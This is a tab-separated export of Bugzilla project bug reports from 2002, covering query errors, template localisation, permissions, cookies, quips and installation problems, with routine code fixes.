157092%TAB%1026449114%TAB%60156%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Checking for invalid regexp on query page,Implement a checking mechanism for invalid regexp%TAB%Checking for invalid regexp on query page,Implement a checking mechanism for invalid regexpinserting an invalid regexp (e.g. "+*") on the query page (fields "Summary" "A description entry" "URL" "Status Whiteboard" "Keywords" and the "boolean chart" fields beyond) results to an error:  "Please stand by ...  Content-type: text/html   Software error:  SELECT DISTINCT bugs.bug_id, bugs.groupset, bugs.bug_severity, bugs.priority, bugs.rep_platform, map_assigned_to.login_name, bugs.bug_status, bugs.resolution, bugs.short_desc FROM bugs, profiles map_assigned_to, profiles map_reporter LEFT JOIN profiles map_qa_contact ON bugs.qa_contact = map_qa_contact.userid LEFT JOIN cc selectVisible_cc ON bugs.bug_id = selectVisible_cc.bug_id AND selectVisible_cc.who = 60156 WHERE ((bugs.groupset & 0) = bugs.groupset OR (bugs.reporter_accessible = 1 AND bugs.reporter = 60156) OR (bugs.cclist_accessible = 1 AND selectVisible_cc.who = 60156 AND not isnull(selectVisible_cc.who)) OR (bugs.assigned_to = 60156) OR (bugs.qa_contact = 60156)) AND bugs.assigned_to = map_assigned_to.userid AND bugs.reporter = map_reporter.userid AND (bugs.bug_status = 'NEW' OR bugs.bug_status = 'ASSIGNED' OR bugs.bug_status = 'REOPENED') AND (LOWER(bugs.bug_file_loc) REGEXP '+*') ORDER BY bugs.bug_id : Got error 'repetition-operator operand invalid' from regexp at globals.pl line 276."   A check for valid regexp should be build in there:  possible solution:  e.g. in globals.pl  sub is_valid_regexp {      my $pat = shift;      return eval { "" =~ /$pat/; 1 } || 0;  }  and for the respective field-checks in buglist.cgi  if ( ! is_valid_regexp ($v) && $t =~ /regexp/ ) {                       	      PuntTryAgain("\"$v\" is not a valid regexp") }
157651%TAB%1026753005%TAB%29274%TAB%CLOSED%TAB%FIXED%TAB%Development%TAB%Reviews,attachment and request management,Reviews,Bugzilla-General%TAB%review: Footer on create attachment page looks wrong., v1%TAB%review: Footer on create attachment page looks wrong., v1Footer on create attachment page looks wrong.,
157692%TAB%1026783503%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%Should replace <label>s with <label for="">s%TAB%Should replace <label>s with <label for="">sWe should change the templates using containing <label> syntax (<label><element>text</label>) to use the indirect idref syntax (<label for="someid">text</label><input id="someid" ...>, since Windows IE's up to version 5.5 do not implement the containing syntax version properly (the labels are not clickable).   There aren't too many instances of this yet, so it should be an easy fix.
157704%TAB%1026795149%TAB%60430%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Accounts%TAB%if you delete a product when usebuggroups is ON, administrator's right may change%TAB%if you delete a product when usebuggroups is ON, administrator's right may changeI was going through Bugzilla code. I found one bug in "editproducts.cgi".  fileName: editproducts.cgi # LineNumber : 651 "AND (groupset !=  9223372036854710271)");  but as per my knowledge and as defined in globals.pl Admin bit munber is  9223372036854775807  So I think it can change admin's right while deleting a product when  usebuggroups is ON.  Correct me if I am wrong.
157756%TAB%1026810728%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Groups_20020716_Branch tracking bug%TAB%Groups_20020716_Branch tracking bugTo properly handle administrators, a group called "admin" will, by default, be able to bless all groups except for admin itself.  Admin itself will only be blessable by users who have been explicitly authorized to bless admin itself.  Checksetup will automatically give both membership in the admin group and the ability to bless the admin group to the administrator specified when running checksetup or any administrators that it finds in the database being converted.
157858%TAB%1026851522%TAB%40200%TAB%CLOSED%TAB%FIXED%TAB%Requirements%TAB%Reviews,Bugzilla-General%TAB%review: Add support for Insiders, Private comments, Private Attachments, Patch for July 12 tip%TAB%review: Add support for Insiders, Private comments, Private Attachments, Patch for July 12 tipAdd support for Insiders, Private comments, Private Attachments
157886%TAB%1026873924%TAB%9105%TAB%CLOSED%TAB%FIXED%TAB%Development%TAB%Reviews,Bugzilla-General%TAB%review: Bugzilla should support translated/localized templates, Eighth version: Whitespace fixes, remove ($) prototyping%TAB%review: Bugzilla should support translated/localized templates, Eighth version: Whitespace fixes, remove ($) prototypingBugzilla should support translated/localized templates, attachment #88445 [details] [diff] [review]: Eighth version: Whitespace fixes, remove ($) prototyping.
158166%TAB%1026987874%TAB%22599%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%thisrandomstring is not a random string%TAB%thisrandomstring is not a random stringBugzilla sends for query results:  --thisrandomstring Content-Type: text/html  <!-- 1.0@bugzilla.org -->       <html>   <head>     <title>Bugzilla is pondering your query</title>   </head>   <body>     <h1 style="margin-top: 20%; text-align: center;">Please stand by ...</h1>     </body> </html> --thisrandomstring Content-Type: text/html Set-Cookie: LASTORDER=bugs.bug_id ; path=/; expires=Sun, 30-Jun-2029 00:00:00 GMT [...] </html> --thisrandomstring--  "thisrandomstring" is *not* a random string.
158236%TAB%1027014316%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Remove 'watchfordiffs' column from namedqueries table%TAB%Remove 'watchfordiffs' column from namedqueries tableI son't know what its for; and 2.14 doesn't use it. Lets kill it.
158474%TAB%1027145146%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List%TAB%Abstract out GenerateSQL into perl module%TAB%Abstract out GenerateSQL into perl moduleThe function GenerateSQL() in buglist.cgi turns a URL into an SQL query. This ability is needed for both generic reporting (bug 12282) and generic charting (bug 16009). The plan is to move this function into a perl module, Search.pm, so this module can be used by all the CGIs which need this ability.
158497%TAB%1027159352%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Interface%TAB%Templatise colchange.cgi%TAB%Templatise colchange.cgiCurrently, colchange.cgi uses "print" to output its column change message. It should use a template (probably the generic message one.)
158498%TAB%1027159488%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%defparams.pl prints an error message in a check function instead of returning it%TAB%defparams.pl prints an error message in a check function instead of returning itdefparams.pl:                print "Dependency graph images are not accessible.\nDelete data/webdot/.htaccess and re-run checksetup.pl to rectify.\n";  I think this needs to be returned by the function, as happens for errors in the other check* functions, for printing elsewhere.  CCing zeroj, who wrote this code, for confirmation.
158499%TAB%1027159608%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Interface%TAB%Templatise XML output,Templatise XML bug output%TAB%Templatise XML output,Templatise XML bug outputThis is a collaboration between xml.cgi and Bug.pm. We need to work out how to make XML generation a template. Preferably a template for show_bug.cgi.
158527%TAB%1027190342%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%can edit all aspects of any bug is a lie%TAB%can edit all aspects of any bug is a liePermissions You have the following permission bits set on your account:      * Can edit all aspects of any bug.  This is not true. I can't edit any aspect of a bug i can't see. nor can i edit all aspects of some security bugs where i'm cc but not a member of the security group for which a bug is tagged.
158562%TAB%1027237424%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs,attachment and request management%TAB%request system needs better UI or more help%TAB%request system needs better UI or more helpBugzilla Version 2.17  This is Bugzilla: the Mozilla bug system. For more information about what Bugzilla is and what it can do, see mozilla.org's bug pages. Edit Attachment #92148 [details] [diff] for Bug #95426   Remove $onebug cruft. Description:  MIME Type:  Flags: patch obsolete Status: first-review second-review needs-work  Pending Requests Ignore Grant Deny review Make a Request  Comment (on the bug):  Actions: New | Query | bug # | Reports | My Votes   Edit prefs, users | Log out timeless@bemail.org --  What i see: Actions: ignore, grant, deny. But um, how am i supposed to know what will happen if I click these buttons when i'm not the person of whom the request was asked?
158564%TAB%1027237577%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Documentation,bugzilla.org,Documentation,bugzilla.org%TAB%Developers Guide changes for 2.16%TAB%Developers Guide changes for 2.16These are things I noticed reading the Developers Guide, which I think we should fix:  > $vars->{id} = 3;  Conventional usage throughout new code is to quote hash keys:   $vars->{'id'} = 3;  > Every template shipped with Bugzilla has a version number on the first line  > such as 1.0@bugzilla.org. You should update this when you edit a template.  As we haven't decided what we are doing about template version numbers, we should probably remove this line, and the following one.  > HTML Templates should have a 2-space indent.  ... and XML ones.  > instead use the variable $::userid  On the principle of eliminating global variables, we should probably be getting people to use $vars->{'user'}{'userid'}.  On template formatting style, I don't know what the problem is over in bug 120925, but I do think we should include the example of good style quoted there (which matches all the templates we have currently.)
158567%TAB%1027239988%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs,attachment and request management%TAB%request.cgi should ignore whitespace%TAB%request.cgi should ignore whitespaceSorry, I can't find a user whose name or email address contains justdave@syndicomm.com. Double-check that the user's name or email address contains that string, or try entering a shorter string.   There's no way I can figure out from the message that mozilla helpfully prefixed whitespace when it pasted the address.
158571%TAB%1027240516%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs,attachment and request management%TAB%request.cgi should update bug activity%TAB%request.cgi should update bug activityWhat's missing: three entries for requests each should indicate when the request was made, of whom it was made, who requested it, and of course link to it.
158651%TAB%1027309110%TAB%9105%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List%TAB%buglist.cgi: currenttime should use time2str%TAB%buglist.cgi: currenttime should use time2strtemplate/en/default/list/list.html.tmpl  At present the time is shown as  [% currenttime %] Suggestion:   [% time2str("%H:%M am %o %B %Y", currenttime) -%]  This then allows at least to localise the order.
158658%TAB%1027311858%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%relogin.cgi should use a template%TAB%relogin.cgi should use a templateAt present relogin.cgi looks like this:     $vars->{'title'} = "Logged Out";     $vars->{'message'} = "<b>Your login has been forgotten</b>.                           The cookie that was remembering your login is                            now gone. You will be prompted for a login the                            next time it is required.";     $template->process("global/message.html.tmpl", $vars)  It probably should load a different template which may call global/message.html.tmpl. Otherwise one cannot localize the strings.
158660%TAB%1027312530%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Accounts%TAB%confirm_login in CGI.pl should use a template for the login dialog%TAB%confirm_login in CGI.pl should use a template for the login dialogIf one goes to query.cgi?GoAheadAndLogIn=1 confirm_login in CGI.pl is called which displays the login dialog.  This function should use a template for the rather common login dialog.  (bugzilla.org says to the 2.16 goals "Templatization of all customer-visible CGI pages, to allow easy customization by the administrator." which is clearly not met ...)
159063%TAB%1027465817%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Administration%TAB%Misc. problems on the editgroups page%TAB%Misc. problems on the editgroups pageOn the groups_20020716_branch, the editgroups page has at least the following bad things :-) I'll file all these in one bug, since it's not trunk code yet and I don't want to bury you in a heap of reviewish nit bugs.   - Action links (Edit / Delete) should have separator; I'd go for the vertical   bar (|).  - "Buggroup" needs to be cleared out. Wtf is a buggroup? (don't answer me, I'm   playing the newbie admin here. :-))  - The "Add Group" link is in the wrong column; it should be in the action column,   naturally.   - You shouldn't allow people to edit the names of the predefined groups like   editbugs; that will break bugzilla in no time.  - The description of the Active Flag makes no sense for the system groups. You   couldn't add bugs to "editcomponents" anyway.   - The last paragraph ("In addition...") is no longer relevant, but in case you   decide to use the text somewhere, s/rexexp/regexp/. :-)
159067%TAB%1027466894%TAB%43662%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Bug activity log doesn't contain group changes%TAB%Bug activity log doesn't contain group changesOn the new groups_20020716_branch, group changes are not logged into the bug activity log.
159199%TAB%1027506238%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Accesskey implementation tracking bug%TAB%Accesskey implementation tracking bugAccesskey implementation tracking bug
159200%TAB%1027506294%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Query/Bug List%TAB%Implement accesskeys on search page%TAB%Implement accesskeys on search pageImplement accesskeys on search page
159294%TAB%1027542682%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs,attachment and request management%TAB%requests need to populate bug activity%TAB%requests need to populate bug activityi thought i filed this in my request bug spree, but i couldn't find it. an example of why one might want this is bug 158565. which unless you had been following reviewers you might not have known that it had any review requests.  things that should be tracked: * request id * creation date [retrievable from bug] * original intended victim [while current victim can change, a lookup for original should be O(1).] * request resolution action/date/actor [this like original intended victim might not match last resolutions for the request]
159362%TAB%1027574439%TAB%61249%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%Bug search list numbering corrupted when searching for a specific bug number,Bug navigation is confusing when viewing a bug not in your last search%TAB%Bug search list numbering corrupted when searching for a specific bug number,Bug navigation is confusing when viewing a bug not in your last searchWhen searching for a bug by entering the bug number, the list of found bugs  looks like this: Bug List: (0 of 1)  This also happened in a different situation i couldn't reproduce.
159565%TAB%1027668764%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%list/list.html.tmpl: Error in hash initialisation%TAB%list/list.html.tmpl: Error in hash initialisationWith the last changes accesskeys had been introduces. Unfortunally an error had be made the closing '}' comes to early.      [% PROCESS select sel = { name => 'bug_severity',                                size => 7 }                                accesskey => 'e' %]
159582%TAB%1027674860%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%search/knob.html.tmpl should use <label> for the radiobuttons%TAB%search/knob.html.tmpl should use <label> for the radiobuttonssearch/knob.html.tmpl should use <label> for the radiobuttons
159593%TAB%1027676970%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Administration%TAB%usedependencies must die%TAB%usedependencies must dieusedependencies is currently only checked in one place, and is pretty useless. "Disabling" dependencies should be done by template hacking.
159627%TAB%1027685705%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Interface%TAB%quips should be editable and deleteable using the web interface%TAB%quips should be editable and deleteable using the web interfaceUntil recently the quips had been stored in data/comments. Now they have been moved into the database it had become much more difficult to delete (or change) quips. The problem is that quips can be added by anyone (needn't to be logged in/anonymous) which potentially increases the number of obscene or offensive quips .  Don't know who should be able to edit/delete them. At least the admin should to so for sure.
159629%TAB%1027686152%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Query/Bug List%TAB%quips.cgi should require a login to access.%TAB%quips.cgi should require a login to access.Spun off from 159627 - there seems no real need for anonymous quip contribution.
159644%TAB%1027690562%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs%TAB%bug/create/create.html.tmpl should use <label>%TAB%bug/create/create.html.tmpl should use <label>bug/create/create.html.tmpl should use <label>
159687%TAB%1027733420%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface,attachment and request management%TAB%attachment/*.tmpl should use <label>%TAB%attachment/*.tmpl should use <label>attachment/*.tmpl should use <label>
159858%TAB%1027868140%TAB%19332%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%bugzilla.org%TAB%bugzilla.org serves 404 not found as application/octet-stream%TAB%bugzilla.org serves 404 not found as application/octet-streamFor those that are curious, the pages are all pre-processed by a perl script (it adds the mozilla.org copyright footer at the bottom of the pages).  Apache redirects anything ending in .html into that perl script.  The perl script then looks for the file, and if it didn't find it, it printed out "Status: 404\n\n" and exited.  Silly me was assuming that if I didn't provide content for the error that Apache would use the default error document.  Guess it doesn't.  The script now prints a 404 error message that has real content in it.
159898%TAB%1027904940%TAB%15150%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%bugzilla.org%TAB%'How To Help' page on bugzilla.org needs update post 2.16 release%TAB%'How To Help' page on bugzilla.org needs update post 2.16 releaseThis page says that submissions 'are very welcome, especially if they are targetted for the 2.16 milestone! '
159901%TAB%1027908084%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%token.cgi: localize strings send to message.html.tmpl (Part one)%TAB%token.cgi: localize strings send to message.html.tmpl (Part one)Going to attach the first patch which moves most of the strings send to message.html.tmpl into messages.html.tmpl. As a plus I moves some title strings into the template.  Still to do: Entangle the strings passed to Token.pm (send email) and to messages.html.tmpl + DisplayError strings.
159996%TAB%1027947425%TAB%51628%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%can only vote once per bug,bug vote instructions are misleading/confusing%TAB%can only vote once per bug,bug vote instructions are misleading/confusingIn any bug, the "vote for a bug" page only allows you to check or uncheck a checkbox, instead of letting you type in how many votes you want to give to a bug. Is this a typo in the bug voting documentation?
160089%TAB%1027998354%TAB%61654%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Syntax error in versioncache%TAB%Syntax error in versioncacheNo it's not the last line of versioncache and no I didn't run out of disk space. I tried to remove it and nothing changed after it had been regenerated.  But I found that the line before looks like that: $::components{'Operator's Console'} = '';  So probably it's just the old known bug with apostrophe?
160096%TAB%1028001374%TAB%54949%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Msg "A legal component ..." due to use of international chars in component name%TAB%Msg "A legal component ..." due to use of international chars in component nameSteps to reproduce ================== Create a product Create a component - use some international characters like "Pøihlašování  uživatelù" Create a bug for the product and component (I had this done in previous version  2.14 already, the problem may apeare here probably) Edit the bug (add some comments) and submit. Keep the component as is  Ezpected ======== All international characters will appeare correctly Submit will succeed.  Observed ======== Some international characters were shown incorrectly Submit failed with message "A legal component must be selected"  Reason ====== All HTML pages miss encoding information, and when browser selects some  default, it is sometime incorrect.  Solution ======== Edit header.html.tmpl and add line into HTML header with encoding (I used  windows-1250)  <meta content="text/html; charset=windows-1250" http-equiv="Content-Type">  Remaining topics to solve ========================= It would be advisable to have parameter for Bugzilla to specify, what encoding  is to be used. I will create a bug (enhancment) for sending e-mails.
160112%TAB%1028007406%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Clean up quip table conversion code%TAB%Clean up quip table conversion codeThe badly-indented error messages are annoying. What we should do is convert data/comments iff its there and there aren't any comments in the db.  We especially don't want to tell people that we created this backup file and they need to get rid of it - if we can tell them that we could remove it ourselves...
160204%TAB%1028034652%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%search/knob.html.tmpl: script type missing, space missing%TAB%search/knob.html.tmpl: script type missing, space missingIn his template there are two minor bugs: -  <script> <!-- +  <script type="text/javascript"> <!--  and  -        <input type="radio"id="cmdtype-doit" +        <input type="radio" id="cmdtype-doit"
160210%TAB%1028035369%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs%TAB%Add MacOSX 10.1 and 10.2 to the os list%TAB%Add MacOSX 10.1 and 10.2 to the os listMacOSX 10.1 exists and is significantly different from 10.0.4 (iirc MS requires 10.1).  MacOSX 10.2 will be a significantly changed creature and was requested
160224%TAB%1028039229%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%remember query radio buttons don't have default%TAB%remember query radio buttons don't have defaultTheres no default for the radio button, which is silly.  I had to change the js to get teh disabling right. remCheckboxChanged will call remTypeChanged if needed.  Why are suboptions disabled for teh remmeber query stuff, but not for the top level radio buttons (the 'remember this query' checkbox is never disabled)? And why does the other radio button option let you use the popups, and in fact then select that radio button if you make a change there?
160227%TAB%1028040599%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%VERSION cookie not set correctly%TAB%VERSION cookie not set correctlyThe VERSION-$product cookie which post_bug sets is now only a session cookie. I looked into this, and it appears that apache is printing                 path=/bugzilla/ ; expires=Sun, 30-Jun-2029 00: 00:00 GMT Set-Cookie: VERSION-Foo=0.999 ;   Note that the path/expires is _above_ the Set-Cookie line (and on a different line, too). This is from a network trace; its not a browser thing. This means that the path/expires stuff isn't used, so it becomes a session cookie, and if the path isn't / then it won't be used at all (because an existing cookie for the real path is more specific)  It appears apache is converting the \<nl> in our set-cookie line into the _opposite_ of a CR, possibly due to the unix line ending?? I'm seeing this on bmo too, so its not a local thing.  Anyway, the fix is to just use . to concatenate the two strings. I'd love an explanation, though.
160279%TAB%1028075331%TAB%44111%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%checksetup.pl doesn't check permission on data/comments%TAB%checksetup.pl doesn't check permission on data/commentsAfter installing bugzilla-2.16, quips were not working. cgi says 'ok your quip is in', but it never actually got in. turns out this is a permission problem in data/:  total 32 -rw-r--r--    1 root     www-data        0 Jul 30 04:56 comments drwxr-x---    2 root     www-data     4096 Jul 30 04:56 duplicates -rw-r--r--    1 root     www-data        0 Jul 30 04:56 mail drwxr-sr-t    2 root     www-data     4096 Jul 30 04:56 mimedump-tmp drwxr-x---    2 root     www-data     4096 Jul 30 04:56 mining -rw-r--r--    1 root     www-data        0 Jul 30 04:56 nomail -rw-rw----    1 www-data www-data     4808 Jul 30 06:07 params drwxrwx---    3 root     www-data     4096 Jul 30 04:56 template -rw-rw----    1 www-data www-data     1731 Jul 31 04:26 versioncache drwxrwx---    2 root     www-data     4096 Jul 30 04:56 webdot  www-data needs to have write permissions. this should be dealt with by checksetup.pl
160297%TAB%1028087592%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General,Installation & Upgrading%TAB%clean up filesystem permissions code in checksetup.pl%TAB%clean up filesystem permissions code in checksetup.plEvery time I review changes to the code in checksetup.pl that deals with filesystem permissions I have to figure it out all over again.  This code should be cleaner and easier to understand.  There should be a table of files/directories and their permissions (in easy-to-understand format rather than as octal masks) which gets processed and reflected into the filesystem.
160410%TAB%1028127621%TAB%12567%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading,Administration%TAB%defparams.pl should support pulldown menus for options%TAB%defparams.pl should support pulldown menus for optionsThis is probably a dup, but I couldn't find a bug for it when I searched; defparams.pl should provide a way for us to create "select box"-type/pulldown menu options, i.e. a, b, c, or d.  Currently, there are only freeform and on/off options supported.
160422%TAB%1028131833%TAB%35569%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%Can't locate data/versioncache in @INC%TAB%Can't locate data/versioncache in @INCGot this error after adding a version and a component to two products.  Full message was:  Software error: Can't locate data/versioncache in @INC (@INC contains: . /usr/lib/perl5/5.6.0/i586-linux /usr/lib/perl5/5.6.0 /usr/lib/perl5/site_perl/5.6.0/i586-linux /usr/lib/perl5/site_perl/5.6.0 /usr/lib/perl5/site_perl) at globals.pl line 627.  For help, please send mail to the webmaster ([no address given]), giving this error message and the time and date of the error.   I renamed versioncache to badversioncache and clicked New from the actions in the  page footer.  Worked.  Noticed that the new versioncache file was exactly like the old one, but the new versioncache had the right permissions - the old was owned by root, group root.  Can't rememeber what else I could have done to trigger this.
160476%TAB%1028164362%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%boolean chart addition doesn't keep query template format%TAB%boolean chart addition doesn't keep query template formatin the boolean chart section.  Expected:  Load the modern format page with an extra element  Actual:  Load the default format page with an extra element  $::FORM{'format'} needs to be passed into the template
160552%TAB%1028193662%TAB%33608%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%enter_bug.cgi and describecomponents.cgi templating unfinished%TAB%enter_bug.cgi and describecomponents.cgi templating unfinishedWhen migrating our customized "Taskzilla" (which uses the term task instead of bug), I noticed that enter_bug.cgi and describecomponents.cgi hardcode a title and an h2 inside the CGI, and then display global/choose-product.html.tmpl  This makes customizing these two pages require editing the code itself, which makes upgrading a pain.  Will attach patches against the cgi's and template files to fix this shortly.
160557%TAB%1028196118%TAB%36180%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%products that start with _ do not show up properly in query.cgi%TAB%products that start with _ do not show up properly in query.cgiIf you have a product name that starts with a underscore (_), the product's components/versions/milestones do not show up on the query.cgi page when that product is selected from the listbox.  1. create a product with a name like "_misc". 2. add some components to this product. 3. now go to the query page. 4. select the _misc (or whatever you named) it product in the list.  Actual Results: the component, version, and target list boxes become empty.  Expected Results: the component, version, and target list boxes should be populated with the components, version, and milestones that correspond to the _misc product.  Additional Information: Looking at the html source, shows in the javascript:    cpts[0] = [  ];   vers[0] = [  ];   tms[0]  = [  ];  Which is why the boxes are empty.  Also I put this as major because it is causing major problems for my company's installation of bugzilla because we have the product called _customer_issue which tracks all customer reported problems. We have a component for everyone of our clients (yes there are a ton of components). It is our largest product, so trying to search for customer issue bugs without limiting it to the particular customer we want is a major pain.  We could change the name to just 'customer-issue' I suppose, but we have the _ in front so that it always sorts to the top of all lists. (it's used the most so it should be at the top shouldn't it.) That also doesn't change the fact that this is a bug.
160631%TAB%1028236586%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%bug_email.pl is broken%TAB%bug_email.pl is brokenLast week the fixes for bug_email got merged, but it appears that noone actually tested it afterwards...  We now chdir('..') at teh top of the script, _AND_ do so before calling processmail.  This is broken on trunk, 2.16, and 2.14.3. 'oops'
160710%TAB%1028274355%TAB%61989%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Taint checking causes problem with rename function%TAB%Taint checking causes problem with rename functionIt seems that when userprefs.cgi has taint checking on, we get the following  error, line 287 of Document.pm is:      return rename($tmpfile, $file)         || $class->error($!);   Bugzilla has suffered an internal error. Please save this page and send it to  jim.silverstein@bear.com with details of what you were doing at the time this  message appeared.   URL: http://chicago1/bugzilla/userprefs.cgi  Template->process() failed twice. First error: [Fri Aug 2 11:40:23 2002] userprefs.cgi: file error - [Fri Aug 2  11:40:23 2002] userprefs.cgi: undef error - [Fri Aug 2 11:40:23 2002]  userprefs.cgi: undef error - [Fri Aug 2 11:40:23 2002] userprefs.cgi: Insecure  dependency in rename while running with -T switch  at /usr/local/lib/perl5/site_perl/5.005/sun4-solaris/Template/Document.pm line  287.  Second error: [Fri Aug 2 11:40:24 2002] userprefs.cgi: Insecure dependency in  rename while running with -T switch  at /usr/local/lib/perl5/site_perl/5.005/sun4-
161203%TAB%1028564031%TAB%62253%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Bug changes with intermediate pages munges fields with multiple values (e.g., CC)%TAB%Bug changes with intermediate pages munges fields with multiple values (e.g., CC)Sometimes, when changing a bug, Bugzilla has to display an intermidiate page.  Examples include specifying the component/version/milestone when a product is changed, the user logging in, resolving "mid-air collisions", and confirming duplicates.  In that intermediate page, Bugzilla needs to save the changes the user wanted to make.  However, for fields with multiple values, e.g., the CC lists, these values are munged.  All the values are concatenated together into one value.  To see this in action, take a bug with CCs.  Change the product and remove a couple of CCs at the same time, so you get the "verify component/version/milestone" page.  Once you specify these values, you get an error, because "user1@domain.comuser2@domain.netuser3@example.org" is not a registered Bugzilla account.  Note that this was noticed in bug 101056.  But it was only noticed and fixed for the case where this user has to log in before committing his change.  It still exists in the other cases.  I discovered this bug in 2.14, but it still exists in 2.16.  I have a fix for this, and I will be submitting them.
161267%TAB%1028602575%TAB%56971%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%bugzilla.org%TAB%RFE: List (voluntary) bugzilla users with URL and project descriptions%TAB%RFE: List (voluntary) bugzilla users with URL and project descriptionsIn the section "Where We're Going", you mention that bugzilla is used in many places beyond mozilla.org. It would be great to see who uses it (if they are o.k. with disclosing that) and have a list of URL links to the corresponding sites/project descriptions. This shows the strenght of the community, probably reads like a "who is who" of important projects, and gives potential new adopters confidence that they are doing the right thing an that bugzilla is going to stay.
161305%TAB%1028618066%TAB%37855%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Accounts%TAB%SQL-error in userprefs.cgi with allowemailchange%TAB%SQL-error in userprefs.cgi with allowemailchangeIf I enable allowemailchange I get the following SQL error when trying to access userprefs.cgi:  SELECT tokentype, issuedate + INTERVAL 3 DAY, eventdata FROM tokens WHERE userid = 1 AND tokentype LIKE 'email%' ORDER BY tokentype ASC LIMIT 1: You have an error in your SQL syntax near '3 DAY, eventdata FROM tokens WHERE user' at line 1 at globals.pl line 276.  The offending bit seems to be the '+ INTERVAL 3 DAY' string.  The Mysql server is version 3.22.32 (Debian Potato). This clearly meets the requirement of 3.22.5.  I checked it on a Debian Woody system (Mysql version 3.23.49) and it works fine there.
161356%TAB%1028634785%TAB%62306%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%mention additional perl module%TAB%mention additional perl modulefor my suse 7.1 linux I had to install    perl -MCPAN -e 'install "File::Temp"' before I could do    perl -MCPAN -e 'install "Template"' (the dependency wasn't picked up automatically.  So you might want to add "File::Temp" to the list of modules on that page.
161369%TAB%1028639819%TAB%38678%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Strip trailing whitespace from login usernames email addresses%TAB%Strip trailing whitespace from login usernames email addressesCurrently if you send a user his login name and password and somehow whitespace gets appended when they copy and paste to try their login they get a wierd error about whitespace, etc. But why should they have to change 'test@domain.com ' to 'test@domain.com' in order to login properly? This is unexpected behavior, IMHO.  Steps to reproduce:  1. Logout of bugzilla if you are already logged in 2. add a space after your login name 3. put in your regular password 4. click Login  actual results: Error message about not wanting whitespace in the username  expected results: logged in successfully with the username being a trimed version of the input
